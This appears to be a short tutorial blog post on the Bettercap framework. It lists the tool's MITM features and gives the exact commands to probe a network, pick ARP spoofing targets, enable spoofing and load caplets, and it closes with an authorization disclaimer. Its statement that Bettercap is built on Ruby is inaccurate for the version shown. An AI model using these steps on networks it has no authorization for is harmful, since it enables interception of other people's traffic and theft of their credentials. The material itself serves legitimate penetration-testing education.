---
title: Bettercap - Arp Spoofing/MITM
publishedOn: January 26th, 2023
slug: bettercap
excerpt: Bettercap is a powerful, flexible, and portable framework for performing various types of Man-In-The-Middle (MITM) attacks. It is built on top of the Ruby programming language and can be used on a wide range of platforms, including Linux, macOS, and Windows.
readingTime: 5 mins
---

# Bettercap
## Key Features 

- ARP spoofing: This is a technique that allows an attacker to intercept network traffic by tricking devices on the network into sending their traffic to the attacker's device instead of the intended destination.
- HTTP(S) and TCP proxying: Bettercap can be configured to intercept and modify network traffic as it passes through the attacker's device. This allows for a wide range of attacks, such as injecting malicious code into webpages or intercepting sensitive information like login credentials.
- Wireless network attacks: Bettercap can also be used to perform various types of attacks on wireless networks, such as deauthenticating clients from a network, or capturing and cracking WPA/WPA2 handshakes.

## Why I like Bettercap

Bettercap is Ettercap's Successor and they, for the most part, knocked Bettercap out of the park. The documentation is kind of lacking but I can understand why. They've made usage so easy, that if you don't understand what your doing they probably don't need to teach you in their documentation. 


One more thing, That Web-UI is cool, It was awesome to have when first using Bettercap but the command line is where it's at.
-----

# **Using Bettercap**

Starting Bettercaps Web-UI. A good way to start but I won't show usage...

`sudo bettercap -caplet http-ui`

Otherwise, start bettercap with

`sudo bettercap en0`

or replace en0 with your network interface, that is mine on Mac M1

## Arp Poisoning

First start wifi.recon, net.probe and net.recon...

`net.probe on; net.recon on`

Now we can see the people on our network

`net.show`

We can set arp targets with

`set arp.spoof.targets <IP>,<IP>,<IP>`
 
 Now we can turn on arp.spoofing.

 `arp.spoof on`

To include a caplet in your session, use...

`caplets.update`

`caplets.show`

copy the name of the caplet you want to use and...

`include <Caplet Name>`

**I will add a Bettercap + Beef-XSS hook article soon**



***It should be noted that Bettercap is a tool that can be used for both legitimate penetration testing and illegal hacking activities. It is important to obtain proper authorization before using it on any network or device.***